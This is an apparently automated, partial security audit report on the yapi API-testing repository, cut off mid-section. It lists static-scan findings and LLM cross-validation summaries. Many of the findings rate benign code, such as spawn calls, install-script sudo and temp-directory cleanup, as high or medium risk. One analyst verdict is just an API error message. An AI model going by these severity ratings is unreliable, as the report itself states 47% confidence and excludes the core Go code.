# Security Audit Report: jamierpond/yapi

> ⚠️ **CORE LANGUAGE NOT SUPPORTED** — This repo's dominant language is **Go**, which is not currently analyzed.
> Unsupported code: Go (92 files)
> Only 146 peripheral files (scripts, configs) were scanned. The core business logic was **NOT audited**.
> This result does **NOT** represent the security posture of the project. Manual review required.

| Field | Value |
|-------|-------|
| Repository | [jamierpond/yapi](https://github.com/jamierpond/yapi) |
| Commit | `e191d6e9d718` |
| Commit Date | 2026-02-26T21:55:41-08:00 |
| Audit Agent | V1 |
| Audit Date | 2026-03-25T08:29:05.561322+00:00 |
| Overall Risk | **MEDIUM (PARTIAL AUDIT — Go code not analyzed)** |
| Confidence | 47% |
| Files Scanned | 146 / 300 |

## Scan Summary

| Metric | Value |
|--------|-------|
| Total files in repo | 300 |
| Files analyzed | 146 |
| Skipped (unsupported type) | 282 |
| Skipped (too large) | 1 |
| Analyzed by language | tool_config: 83, dependency: 2, skill_prompt: 2, javascript: 52, shell: 7 |
| Dominant language | Go (❌ NOT SUPPORTED) |
| Code coverage | 144/236 code files (61%) |
| Unsupported code | Go(92) |
| Top file types | .go(92), .yml(74), .tsx(27), .ts(23), .md(22), .ttf(18), .sh(7), (no ext)(6) |

## Severity Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 9 |
| 🟡 MEDIUM | 15 |
| 🔵 LOW | 5 |
| ⚪ INFO | 0 |
| 🟢 SAFE | 9 |

## Trust Assumptions & Verification

### 🛡️ 安全运行的前提条件

以下为当前 skill 的核心信任假设。未通过验证的条件需要人工确认，否则相关风险不应降级。

1. ❌ **The URLs written into .yapi.yml files by the agent or user point to intended, legitimate API endpoints and not to internal network resources or attacker-controlled servers** *(confidence: 0%)*
   - 检验结果：Found 0 source(s) for .yapi.yml url field. Confidence: 0%. Could not confidently confirm — manual check recommended.
   - 关联主体：`.yapi.yml url field`

2. ❌ **The agent writing .yapi.yml files is operating under trusted instructions and has not been prompt-injected to target unintended environments or endpoints** *(confidence: 30%)*
   - 检验结果：Insufficient data for AI agent generating .yapi.yml content — manual check recommended.
   - 关联主体：`AI agent generating .yapi.yml content`

3. ❌ **env_files referenced in yapi.config.yml (e.g. .env.prod) are listed in .gitignore and are never committed to version control** *(confidence: 30%)*
   - 检验结果：Insufficient data for .env.prod and similar env_files — manual check recommended.
   - 关联主体：`.env.prod and similar env_files`

4. ❌ **The shell environment where yapi runs does not expose sensitive variables to untrusted processes or logs** *(confidence: 30%)*
   - 检验结果：Insufficient data for Host shell environment — manual check recommended.
   - 关联主体：`Host shell environment`

5. ❌ **The assert expression evaluator in yapi's Go implementation does not pass user-supplied strings to a shell or eval, and safely handles malicious jq-style expressions** *(confidence: 30%)*
   - 检验结果：Insufficient data for yapi CLI assert expression parser (cli/ Go code) — manual check recommended.
   - 关联主体：`yapi CLI assert expression parser (cli/ Go code)`

6. ❌ **https://yapi.run/install/mac.sh, https://yapi.run/install/linux.sh, and https://yapi.run/install/windows.ps1 are served from infrastructure controlled by the legitimate yapi maintainer (jamierpond)** *(confidence: 0%)*
   - 检验结果：Found 0 source(s) for yapi.run install endpoint. Confidence: 0%. Could not confidently confirm — manual check recommended.
   - 关联主体：`yapi.run install endpoint`

7. ✅ **The yapi project (github.com/jamierpond/yapi) has not been compromised and the published binaries match the source code** *(confidence: 98%)*
   - 检验结果：github is in TRUSTED_SERVICES_WHITELIST; reputation verification is marked VERIFIED by policy.
   - 关联主体：`github.com/jamierpond/yapi`
   - 证据：[Trusted service whitelist policy](https://github.com/)

8. ❌ **The AUR_SSH_KEY CI secret is scoped only to the release pipeline and is not accessible to pull request workflows or untrusted contributors** *(confidence: 30%)*
   - 检验结果：Insufficient data for AUR_SSH_KEY GitHub Actions secret — manual check recommended.
   - 关联主体：`AUR_SSH_KEY GitHub Actions secret`

9. ❌ **yapi is a reputable, widely-used service** *(confidence: 30%)*
   - 检验结果：Insufficient data for yapi — manual check recommended.
   - 关联主体：`yapi`

## Detailed Findings

### 🟠 Finding #1: Dangerous pattern: child_process module

- **File**: `apps\web\app\api\validate\route.ts`
- **Line**: 2
- **Severity**: HIGH
- **Source**: static
- **Description**: System command execution

```
       1 | import { NextRequest, NextResponse } from "next/server";
>>>    2 | import { spawn } from "child_process";
       3 | import {
       4 |   ValidateRequestSchema,
       5 |   ValidateResponseSchema,
       6 |   type ValidateResponse,
       7 | } from "@/app/types/api-contract";
```

### 🟠 Finding #2: Dangerous pattern: spawn()

- **File**: `apps\web\app\api\validate\route.ts`
- **Line**: 39
- **Severity**: HIGH
- **Source**: static
- **Description**: System command execution

```
      34 | 
      35 |     const { yaml } = parseResult.data;
      36 | 
      37 |     // Spawn yapi validate and pipe yaml to stdin
      38 |     const result = await new Promise<string>((resolve, reject) => {
>>>   39 |       const proc = spawn(getYapiPath(), ["validate", "--json", "-"], {
      40 |         timeout: 5000,
      41 |       });
      42 | 
      43 |       let stdout = "";
      44 |       let stderr = "";
```

### 🟠 Finding #3: Dangerous pattern: child_process module

- **File**: `apps\web\app\api\yapi\version\route.ts`
- **Line**: 2
- **Severity**: HIGH
- **Source**: static
- **Description**: System command execution

```
       1 | import { NextResponse } from "next/server";
>>>    2 | import { spawn } from "child_process";
       3 | import { z } from "zod";
       4 | import { getYapiPath } from "@/app/lib/yapi-path";
       5 | // fooooo
       6 | 
       7 | const VersionResponseSchema = z.object({
```

### 🟠 Finding #4: Dangerous pattern: spawn()

- **File**: `apps\web\app\api\yapi\version\route.ts`
- **Line**: 24
- **Severity**: HIGH
- **Source**: static
- **Description**: System command execution

```
      19 |  * Uses `yapi version --json`.
      20 |  */
      21 | export async function GET() {
      22 |   try {
      23 |     const result = await new Promise<string>((resolve, reject) => {
>>>   24 |       const proc = spawn(getYapiPath(), ["version", "--json"], {
      25 |         timeout: 5000,
      26 |       });
      27 | 
      28 |       let stdout = "";
      29 |       let stderr = "";
```

### 🟠 Finding #5: Dangerous pattern: child_process module

- **File**: `apps\web\app\docs\madea.config.tsx`
- **Line**: 14
- **Severity**: HIGH
- **Source**: static
- **Description**: System command execution

```
       9 | import Link from "next/link";
      10 | import Markdown from "react-markdown";
      11 | import remarkGfm from "remark-gfm";
      12 | import rehypeHighlight from "rehype-highlight";
      13 | import path from "path";
>>>   14 | import { execSync } from "child_process";
      15 | 
      16 | // Get version info at build time (uses Vercel env vars, falls back to git for local dev)
      17 | function getVersionInfo(): { semver: string; commit: string } {
      18 |   // Vercel provides VERCEL_GIT_COMMIT_SHA
      19 |   const commit = process.env.VERCEL_GIT_COMMIT_SHA?.slice(0, 7)
```

### 🟠 Finding #6: Dangerous pattern: execSync()

- **File**: `apps\web\app\docs\madea.config.tsx`
- **Line**: 33
- **Severity**: HIGH
- **Source**: static
- **Description**: System command execution

```
      28 | }
      29 | 
      30 | function tryExec(cmd: string): string | null {
      31 |   try {
      32 |     const repoRoot = path.join(process.cwd(), "..");
>>>   33 |     return execSync(cmd, { cwd: repoRoot, encoding: "utf-8", stdio: ["pipe", "pipe", "ignore"] }).trim();
      34 |   } catch {
      35 |     return null;
      36 |   }
      37 | }
      38 | 
```

### 🟠 Finding #7: Shell: sudo_usage

- **File**: `apps\web\public\install\linux.sh`
- **Line**: 40
- **Severity**: HIGH
- **Source**: static
- **Description**: Uses or modifies sudo privileges

```
      35 | fi
      36 | echo "Checksum verified."
      37 | 
      38 | # Extract and install
      39 | tar xzf "$ASSET"
>>>   40 | sudo mv yapi /usr/local/bin/
      41 | rm -rf "$TMPDIR"
      42 | 
      43 | echo "yapi installed successfully!"
      44 | yapi version
```

### 🟠 Finding #8: Shell: sudo_usage

- **File**: `apps\web\public\install\mac.sh`
- **Line**: 40
- **Severity**: HIGH
- **Source**: static
- **Description**: Uses or modifies sudo privileges

```
      35 | fi
      36 | echo "Checksum verified."
      37 | 
      38 | # Extract and install
      39 | tar xzf "$ASSET"
>>>   40 | sudo mv yapi /usr/local/bin/
      41 | rm -rf "$TMPDIR"
      42 | 
      43 | echo "yapi installed successfully!"
      44 | yapi version
```

### 🟠 Finding #9: Shell: install_binary

- **File**: `cli\scripts\vercel-build.sh`
- **Line**: 52
- **Severity**: HIGH
- **Source**: static
- **Description**: Installs binary to system PATH

```
      47 | cd cli
      48 | go build -ldflags "${LDFLAGS}" -o ./bin/yapi ./cmd/yapi
      49 | 
      50 | echo "Installing yapi to /usr/local/bin..."
      51 | mkdir -p /usr/local/bin
>>>   52 | cp ./bin/yapi /usr/local/bin/yapi
      53 | chmod +x /usr/local/bin/yapi
      54 | 
      55 | echo "Copying yapi to monorepo root bin/ for Next.js file tracing..."
      56 | mkdir -p ../bin
      57 | cp ./bin/yapi ../bin/yapi
```

### 🟡 Finding #10: Skill Prompt: prompt_embedded_shell

- **File**: `SKILL.md`
- **Line**: 47
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Shell code block with dangerous commands embedded in skill instructions

```
      44 | 
      45 | Now your tests use `${url}` and `${API_KEY}` - same test, any environment:
      46 | 
>>>   47 | ```bash
      48 | yapi run get-users.yapi.yml              # uses local (default)
      49 | yapi run get-users.yapi.yml --env staging
      50 | yapi run get-users.yapi.yml --env prod
      51 | ```
```

### 🟡 Finding #11: Dangerous pattern: network fetch

- **File**: `apps\web\app\components\Editor.tsx`
- **Line**: 90
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
      85 |   const validateContent = useCallback(async (content: string) => {
      86 |     const model = editorRef.current?.getModel();
      87 |     if (!model) return;
      88 | 
      89 |     try {
>>>   90 |       const response = await fetch("/api/validate", {
      91 |         method: "POST",
      92 |         headers: { "Content-Type": "application/json" },
      93 |         body: JSON.stringify({ yaml: content }),
      94 |       });
      95 | 
```

### 🟡 Finding #12: Dangerous pattern: network fetch

- **File**: `apps\web\app\components\Landing.tsx`
- **Line**: 11
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
       6 | async function getStats() {
       7 |   try {
       8 |     const FIVE_MINUTES_SECONDS = 300;
       9 |     const [totalDownloads, releasesRes, vscodeInstalls, openVSXDownloads, githubStats] = await Promise.all([
      10 |       getTotalDownloads(),
>>>   11 |       fetch("https://api.github.com/repos/jamierpond/yapi/releases/latest", {
      12 |         next: { revalidate: FIVE_MINUTES_SECONDS },
      13 |       }),
      14 |       getVSCodeInstalls(),
      15 |       getOpenVSXDownloads(),
      16 |       getGitHubStats(),
```

### 🟡 Finding #13: Dangerous pattern: network fetch

- **File**: `apps\web\app\components\Playground.tsx`
- **Line**: 171
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
     166 |   async function handleRun() {
     167 |     setIsLoading(true);
     168 |     setResult(null);
     169 | 
     170 |     try {
>>>  171 |       const response = await fetch("/api/execute", {
     172 |         method: "POST",
     173 |         headers: {
     174 |           "Content-Type": "application/json",
     175 |         },
     176 |         body: JSON.stringify({ yaml }),
```

### 🟡 Finding #14: Dangerous pattern: network fetch

- **File**: `apps\web\app\lib\github.ts`
- **Line**: 64
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
      59 |   let allNodes: Release[] = [];
      60 |   let totalCount = 0;
      61 |   let cursor: string | undefined;
      62 | 
      63 |   do {
>>>   64 |     const res = await fetch("https://api.github.com/graphql", {
      65 |       method: "POST",
      66 |       headers: {
      67 |         Authorization: `Bearer ${token}`,
      68 |         "Content-Type": "application/json",
      69 |       },
```

### 🟡 Finding #15: Dangerous pattern: network fetch

- **File**: `apps\web\app\lib\github.ts`
- **Line**: 103
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
      98 | 
      99 | export async function getGitHubStats(): Promise<{ stars: number | null; forks: number | null }> {
     100 |   try {
     101 |     const token = getGitHubToken();
     102 |     assert(token, "GitHub token is required");
>>>  103 |     const res = await fetch("https://api.github.com/repos/jamierpond/yapi", {
     104 |       headers: token ? { Authorization: `Bearer ${token}` } : {},
     105 |       next: { revalidate: 3600 },
     106 |     });
     107 |     if (!res.ok) {
     108 |       console.error(`[getGitHubStats] GitHub API error: ${res.status} ${res.statusText}`);
```

### 🟡 Finding #16: Dangerous pattern: network fetch

- **File**: `apps\web\app\lib\github.ts`
- **Line**: 168
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
     163 |   }>;
     164 | };
     165 | 
     166 | export async function getVSCodeInstalls(): Promise<number | null> {
     167 |   try {
>>>  168 |     const res = await fetch(
     169 |       "https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery?api-version=7.2-preview.1",
     170 |       {
     171 |         method: "POST",
     172 |         headers: { "Content-Type": "application/json" },
     173 |         body: JSON.stringify({
```

### 🟡 Finding #17: Dangerous pattern: network fetch

- **File**: `apps\web\app\lib\github.ts`
- **Line**: 199
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Filesystem/network operations

```
     194 |   }
     195 | }
     196 | 
     197 | export async function getOpenVSXDownloads(): Promise<number | null> {
     198 |   try {
>>>  199 |     const res = await fetch(
     200 |       "https://open-vsx.org/api/yapi/yapi-extension",
     201 |       { next: { revalidate: 3600 } }
     202 |     );
     203 | 
     204 |     if (!res.ok) return null;
```

### 🟡 Finding #18: Shell: rm_recursive

- **File**: `apps\web\public\install\linux.sh`
- **Line**: 33
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Recursive file deletion [×2 occurrences at lines: 33, 41]

```
--- Line 33 ---
      28 | ACTUAL=$(sha256sum "$ASSET" | awk '{print $1}')
      29 | if [ "$EXPECTED" != "$ACTUAL" ]; then
      30 |   echo "Checksum verification failed!"
      31 |   echo "Expected: $EXPECTED"
      32 |   echo "Actual:   $ACTUAL"
>>>   33 |   rm -rf "$TMPDIR"
      34 |   exit 1
      35 | fi
      36 | echo "Checksum verified."
      37 | 
      38 | # Extract and install

--- Line 41 ---
      36 | echo "Checksum verified."
      37 | 
      38 | # Extract and install
      39 | tar xzf "$ASSET"
      40 | sudo mv yapi /usr/local/bin/
>>>   41 | rm -rf "$TMPDIR"
      42 | 
      43 | echo "yapi installed successfully!"
      44 | yapi version
```

### 🟡 Finding #19: Shell: rm_recursive

- **File**: `apps\web\public\install\mac.sh`
- **Line**: 33
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Recursive file deletion [×2 occurrences at lines: 33, 41]

```
--- Line 33 ---
      28 | ACTUAL=$(shasum -a 256 "$ASSET" | awk '{print $1}')
      29 | if [ "$EXPECTED" != "$ACTUAL" ]; then
      30 |   echo "Checksum verification failed!"
      31 |   echo "Expected: $EXPECTED"
      32 |   echo "Actual:   $ACTUAL"
>>>   33 |   rm -rf "$TMPDIR"
      34 |   exit 1
      35 | fi
      36 | echo "Checksum verified."
      37 | 
      38 | # Extract and install

--- Line 41 ---
      36 | echo "Checksum verified."
      37 | 
      38 | # Extract and install
      39 | tar xzf "$ASSET"
      40 | sudo mv yapi /usr/local/bin/
>>>   41 | rm -rf "$TMPDIR"
      42 | 
      43 | echo "yapi installed successfully!"
      44 | yapi version
```

### 🟡 Finding #20: Shell: package_install

- **File**: `cli\scripts\run-all-examples-parallel.sh`
- **Line**: 11
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Installs system packages — check if expected

```
       6 | root_dir="$(cd "$script_dir/.." && pwd)"
       7 | 
       8 | # Check if parallel is installed
       9 | if ! command -v parallel &> /dev/null; then
      10 |   echo "error: GNU parallel is not installed"
>>>   11 |   echo "install with: brew install parallel"
      12 |   exit 1
      13 | fi
      14 | 
      15 | echo "testing all example files in parallel..."
      16 | 
```

### 🟡 Finding #21: Shell: chmod_executable

- **File**: `cli\scripts\vercel-build.sh`
- **Line**: 53
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Makes files executable — check what file is being modified [×2 occurrences at lines: 53, 58]

```
--- Line 53 ---
      48 | go build -ldflags "${LDFLAGS}" -o ./bin/yapi ./cmd/yapi
      49 | 
      50 | echo "Installing yapi to /usr/local/bin..."
      51 | mkdir -p /usr/local/bin
      52 | cp ./bin/yapi /usr/local/bin/yapi
>>>   53 | chmod +x /usr/local/bin/yapi
      54 | 
      55 | echo "Copying yapi to monorepo root bin/ for Next.js file tracing..."
      56 | mkdir -p ../bin
      57 | cp ./bin/yapi ../bin/yapi
      58 | chmod +x ../bin/yapi

--- Line 58 ---
      53 | chmod +x /usr/local/bin/yapi
      54 | 
      55 | echo "Copying yapi to monorepo root bin/ for Next.js file tracing..."
      56 | mkdir -p ../bin
      57 | cp ./bin/yapi ../bin/yapi
>>>   58 | chmod +x ../bin/yapi
      59 | 
      60 | echo "yapi installed: $(which yapi)"
      61 | yapi version 2>/dev/null || true
      62 | 
      63 | echo "Generating CLI documentation..."
```

### 🟡 Finding #22: Shell: rm_recursive

- **File**: `cli\scripts\vercel-build.sh`
- **Line**: 43
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Recursive file deletion

```
      38 | LDFLAGS="-X main.version=${VERSION} -X main.commit=${COMMIT} -X main.date=${DATE}"
      39 | 
      40 | 
      41 | echo "Syncing topic docs into CLI embed dir..."
      42 | mkdir -p cli/internal/docs/topics
>>>   43 | rm -rf cli/internal/docs/topics/*
      44 | cp docs/topics/*.md cli/internal/docs/topics/
      45 | 
      46 | echo "Building yapi CLI..."
      47 | cd cli
      48 | go build -ldflags "${LDFLAGS}" -o ./bin/yapi ./cmd/yapi
```

### 🟡 Finding #23: Shell: mkdir_system

- **File**: `cli\scripts\vercel-build.sh`
- **Line**: 51
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Creates directories in system paths

```
      46 | echo "Building yapi CLI..."
      47 | cd cli
      48 | go build -ldflags "${LDFLAGS}" -o ./bin/yapi ./cmd/yapi
      49 | 
      50 | echo "Installing yapi to /usr/local/bin..."
>>>   51 | mkdir -p /usr/local/bin
      52 | cp ./bin/yapi /usr/local/bin/yapi
      53 | chmod +x /usr/local/bin/yapi
      54 | 
      55 | echo "Copying yapi to monorepo root bin/ for Next.js file tracing..."
      56 | mkdir -p ../bin
```

### 🟡 Finding #24: Skill Prompt: prompt_embedded_shell

- **File**: `docs\topics\skill.md`
- **Line**: 27
- **Severity**: MEDIUM
- **Source**: static
- **Description**: Shell code block with dangerous commands embedded in skill instructions

```
      24 | 
      25 | ### Run a request file
      26 | 
>>>   27 | ```bash
      28 | yapi run request.yapi.yml
      29 | yapi run request.yapi.yml -e prod   # with environment
      30 | ```
      31 | 
```

### 🔵 Finding #25: Shell: system_info

- **File**: `apps\web\public\install\linux.sh`
- **Line**: 7
- **Severity**: LOW
- **Source**: static
- **Description**: Collects system information

```
       2 | set -e
       3 | 
       4 | echo "Installing yapi for Linux..."
       5 | 
       6 | # Detect architecture
>>>    7 | ARCH=$(uname -m)
       8 | if [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
       9 |   ASSET="yapi_linux_arm64.tar.gz"
      10 | elif [ "$ARCH" = "x86_64" ]; then
      11 |   ASSET="yapi_linux_amd64.tar.gz"
      12 | else
```

### 🔵 Finding #26: Shell: system_info

- **File**: `apps\web\public\install\mac.sh`
- **Line**: 7
- **Severity**: LOW
- **Source**: static
- **Description**: Collects system information

```
       2 | set -e
       3 | 
       4 | echo "Installing yapi for macOS..."
       5 | 
       6 | # Detect architecture
>>>    7 | ARCH=$(uname -m)
       8 | if [ "$ARCH" = "arm64" ]; then
       9 |   ASSET="yapi_darwin_arm64.tar.gz"
      10 | elif [ "$ARCH" = "x86_64" ]; then
      11 |   ASSET="yapi_darwin_amd64.tar.gz"
      12 | else
```

### 🔵 Finding #27: Shell: system_info

- **File**: `cli\scripts\run-all-examples-parallel.sh`
- **Line**: 18
- **Severity**: LOW
- **Source**: static
- **Description**: Collects system information

```
      13 | fi
      14 | 
      15 | echo "testing all example files in parallel..."
      16 | 
      17 | find "$root_dir/examples" -type f \( -name "*.yml" -o -name "*.yaml" \) | \
>>>   18 |   grep -v -e '/invalid/' -e '\.fail\.' -e '\.local\.' | sort | \
      19 |   parallel --halt now,fail=1 --jobs 25 --tag 'yapi run {}'
      20 | 
      21 | echo "all examples tested successfully"
```

### 🔵 Finding #28: Shell: system_info

- **File**: `cli\scripts\vercel-build.sh`
- **Line**: 5
- **Severity**: LOW
- **Source**: static
- **Description**: Collects system information [×2 occurrences at lines: 5, 15]

```
--- Line 5 ---
       1 | #!/bin/bash
       2 | set -e
       3 | 
       4 | IS_DARWIN=false
>>>    5 | if [ "$(uname -s)" = "Darwin" ]; then
       6 |     IS_DARWIN=true
       7 |     echo "Running on macOS - skipping Go build, only building web"
       8 | fi
       9 | 
      10 | echo "=== Vercel Build Script ==="

--- Line 15 ---
      10 | echo "=== Vercel Build Script ==="
      11 | 
      12 | # Install Go if not available
      13 | if ! command -v go &> /dev/null; then
      14 |     echo "Installing Go..."
>>>   15 |     ARCH=$(uname -m)
      16 |     case "$ARCH" in
      17 |         x86_64) ARCH="amd64" ;;
      18 |         aarch64|arm64) ARCH="arm64" ;;
      19 |     esac
      20 | 
```

## LLM Cross-Validation Results

### Analysis Group #1

- **Final Severity**: SAFE
- **Confidence**: 100%
- **Is Malicious**: False
- **Is Gray Area**: False

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard GoReleaser configuration file (.goreleaser.next.yaml) for the yapi CLI tool. It defines build targets for Linux, Darwin, and Windows across amd64 and arm64 architectures, specifies archive formats, checksum generation, and release settings. There is nothing unexpected or suspicious in this file — it is a typical, minimal GoReleaser v2 configuration with standard ldflags for version embedding and binary stripping.

**intent_analyst** (openai/gpt-5.3-codex):
> This `.goreleaser.next.yaml` is a standard GoReleaser configuration for building and packaging the `yapi` CLI across Linux/macOS/Windows and amd64/arm64, embedding version metadata at link time, producing archives/checksums, and creating prerelease artifacts labeled as “Next”. Its intent is release automation, not runtime behavior manipulation.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The provided code is a standard, benign GoReleaser configuration file used to automate the building and packaging of Go binaries. It contains standard directives for cross-compilation, ldflags for version injection, and archive formatting. There are no custom scripts, pre/post-build hooks, or suspicious configurations that could be leveraged for malicious activity. From an attacker's perspective, this file is uninteresting in its current state, as it purely defines declarative build steps for a well-known tool.

### Analysis Group #2

- **Final Severity**: SAFE
- **Confidence**: 43%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This configuration is used by GoReleaser CI/CD pipelines to automate the build and release process for the yapi CLI tool across Linux, macOS, and Windows platforms. It handles binary compilation, archive creation, checksum generation, AUR package publishing, and Homebrew cask updates.
- The safe/correct use of this pattern is CI-driven reproducible releases: (1) build from tagged source using fixed Go/toolchain versions, (2) embed version/commit/date for traceability, (3) produce per-platform artifacts and checksums, and (4) publish via trusted package channels (AUR/Homebrew) using least-privilege credentials in CI secrets. The Homebrew post-install `xattr -dr com.apple.quarantine` can be legitimate when distributing unsigned/unnotarized binaries that would otherwise be blocked by macOS quarantine, but it should be treated as a temporary compatibility workaround. The AUR `private_key` usage is also legitimate when the key is loaded from secure CI secrets and restricted to only the target repository.

### Why this might be dangerous:
- This becomes dangerous under supply-chain compromise conditions. If CI, release credentials, or source tags are compromised, the pipeline can distribute trojaned binaries to Linux/macOS/Windows users at scale. The gray-area risk is the cask hook that removes quarantine attributes: if a malicious binary is ever published, this step reduces an OS-level warning barrier and may increase successful execution. Likewise, if `AUR_SSH_KEY` is leaked or over-scoped, an attacker can push malicious PKGBUILD/release updates to AUR. Missing/weak safeguards that increase risk include: lack of explicit code-signing/notarization requirements, reliance on quarantine stripping rather than trust-chain validation, and potentially insufficient provenance/attestation guarantees in release outputs.

### Recommendations:
- [security_analyst] No action required. This is a clean, standard GoReleaser configuration with no security concerns. The use of environment variables for sensitive values (AUR_SSH_KEY) follows best practices.
- [intent_analyst] Keep this config, but harden release trust: enable artifact signing (and macOS signing/notarization), publish/verifiably enforce checksums/signatures in downstream package definitions, use short-lived/OIDC-based CI credentials where possible, scope AUR keys to minimum permissions, protect tags/branches with required reviews, and add release provenance (e.g., SLSA-style attestations). Reevaluate whether quarantine removal is necessary; prefer notarized binaries so Gatekeeper trust is preserved instead of bypassed.
- [adversarial_analyst] Check OpenRouter API response

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard GoReleaser configuration file (.goreleaser.yaml) for building and distributing the 'yapi' CLI tool. It defines build targets for multiple OS/architecture combinations, archive formats, checksum generation, AUR (Arch User Repository) packaging, and Homebrew cask distribution. All elements are consistent with a legitimate open-source Go CLI project release pipeline. The AUR private key is properly sourced from an environment variable rather than hardcoded. The Homebrew post-install hook uses xattr to remove macOS quarantine attributes, which is a standard and expected practice for distributing macOS binaries outside the App Store.

**intent_analyst** (openai/gpt-5.3-codex):
> This `.goreleaser.yaml` is a standard release automation configuration for a Go CLI project: it builds `yapi` for multiple OS/architectures, archives binaries, generates checksums/changelog data, and publishes to package ecosystems (AUR and Homebrew Cask). The intent is legitimate software distribution and metadata stamping, not hidden execution or persistence behavior.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> Unexpected API response format: {"error": {"message": "The operation was aborted", "code": 502}}

#### Disagreements Between Models

- **security_analyst**: SAFE - This is a standard GoReleaser configuration file (.goreleaser.yaml) for building and distributing the 'yapi' CLI tool. It defines build targets for multiple OS/architecture combinations, archive forma
- **intent_analyst**: LOW - This `.goreleaser.yaml` is a standard release automation configuration for a Go CLI project: it builds `yapi` for multiple OS/architectures, archives binaries, generates checksums/changelog data, and 
- **adversarial_analyst**: UNKNOWN - Unexpected API response format: {"error": {"message": "The operation was aborted", "code": 502}}

### Analysis Group #3

- **Final Severity**: SAFE
- **Confidence**: 77%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This configuration file is used by a project management or CI/CD tool (likely 'pond') to specify that pull requests should target the 'next' branch as their base branch, rather than the default (e.g., 'main' or 'master').
- This pattern is safe when `next` is an intentional integration branch in a well-defined Git workflow (for example, feature branches -> `next` -> `main` after validation). Correct usage includes: (1) documenting why `next` is the base branch, (2) enforcing branch protections on `next` similar to `main` (required reviews, CI checks, status checks), (3) ensuring merge/promotion rules from `next` to `main` are controlled and auditable, and (4) making sure contributors and automation tools consistently use the same branch strategy so PRs are reviewed in the expected place.
- This is a standard configuration setting used by automation tools (like CI/CD pipelines, repository management bots, or CLI tools) to determine which branch new pull requests should target by default (e.g., targeting a `next` branch for upcoming releases instead of `main`).

### Why this might be dangerous:
- This becomes dangerous if `next` is less protected than `main` and automation silently routes PRs there, allowing lower-friction merges that bypass normal controls. Specific risky conditions include: missing required reviews on `next`, weaker CI policies on `next`, auto-merge enabled without equivalent safeguards, or team members assuming `main` is the only branch needing scrutiny. In that case, an attacker or careless contributor could land risky code in `next`, and if `next` is later promoted to production, protections are effectively bypassed indirectly.
- There is no direct abuse scenario for this specific line of code. An attacker would need prior write access to the repository to modify this file, at which point they could already commit malicious code directly. Changing the base branch to a malicious branch would be noisy and easily detectable during the PR review process.

### Recommendations:
- [security_analyst] No action required. This file is benign and serves a standard configuration purpose.
- [intent_analyst] Keep this setting only if `next` is intentionally part of your release process. Add/verify branch protection rules on `next` (review requirements, mandatory CI, signed commits if applicable), document branch promotion policy (`next` -> `main`), and periodically audit automation configs to ensure no security controls are weaker on the configured PR base branch.
- [adversarial_analyst] No action required. Ensure standard repository access controls and branch protection rules are in place to prevent unauthorized modifications to configuration files.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This file is a minimal tool configuration file (.pond.yml) containing a single configuration directive specifying the base branch for pull requests ('pr_base_branch: next'). There is no executable code, no network calls, no obfuscation, and no access to sensitive resources. It is a straightforward project configuration file with no security concerns.

**intent_analyst** (openai/gpt-5.3-codex):
> This `.pond.yml` file appears to configure automation behavior by setting `pr_base_branch: next`, which means generated or automated pull requests are intended to target the `next` branch instead of `main` (or another default). The intent is most likely legitimate release-flow management (e.g., development integration branch), not harmful behavior by itself.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The provided code snippet is a simple, standard configuration line specifying the default base branch (`next`) for pull requests. From an attacker's perspective, there is no executable code, no dynamic evaluation, and no sensitive data exposure here. It is purely declarative configuration for a development workflow tool and presents no direct attack surface.

#### Disagreements Between Models

- **security_analyst**: SAFE - This file is a minimal tool configuration file (.pond.yml) containing a single configuration directive specifying the base branch for pull requests ('pr_base_branch: next'). There is no executable cod
- **intent_analyst**: LOW - This `.pond.yml` file appears to configure automation behavior by setting `pr_base_branch: next`, which means generated or automated pull requests are intended to target the `next` branch instead of `
- **adversarial_analyst**: SAFE - The provided code snippet is a simple, standard configuration line specifying the default base branch (`next`) for pull requests. From an attacker's perspective, there is no executable code, no dynami

### Analysis Group #4

- **Final Severity**: SAFE
- **Confidence**: 79%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- Used by the Codecov service to determine when to fail or pass coverage status checks on pull requests. The thresholds allow minor coverage drops without blocking merges, which is a common and reasonable CI/CD practice.
- This is a common and generally safe pattern when used deliberately. Correct usage is to set small thresholds that absorb non-semantic coverage variance (e.g., generated code shifts, refactors, line mapping noise) without blocking merges unnecessarily. A safe setup typically combines these thresholds with: (1) an explicit minimum target (for example, project coverage must stay above X%), (2) patch coverage enforcement focused on new/changed code, and (3) branch protection rules requiring coverage checks to pass before merge. In that model, thresholds are a tolerance band, not a replacement for quality gates.
- This is the standard configuration file used by Codecov to define acceptable code coverage thresholds. It prevents CI pipelines from failing due to minor, acceptable drops in test coverage (5% overall, 2% on a specific patch).

### Why this might be dangerous:
